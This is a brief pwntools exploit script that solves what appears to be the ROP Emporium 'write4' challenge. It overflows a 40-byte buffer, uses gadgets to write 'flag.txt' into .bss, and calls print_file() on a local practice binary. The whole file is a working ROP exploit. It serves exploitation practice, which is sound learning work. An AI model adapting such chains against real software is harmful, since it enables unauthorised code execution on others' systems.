from pwn import *
elf = context.binary = ELF('./write4',checksec=False)
p = process()

offset = 40

bss_ADDR = 0x00601038 # 0x00000000601000-0x00000000602000 rw-    vmmap tells us addresses that are writeable.
mov_ADDR = 0x0000000000400628 #mov qword ptr [r14], r15; ret;
pop_ADDR = 0x0000000000400690  #pop r14; pop r15; ret;

payload = flat(
        b'A'*offset,
        pop_ADDR,
        bss_ADDR,
        b'flag.txt',
        mov_ADDR,
        0x0000000000400693, # pop rdi; ret;
        bss_ADDR,
        0x0000000000400620 # print_file()
)
write("payload.txt",payload)
p.recvuntil(b"> ")
p.sendline(payload)
p.interactive()
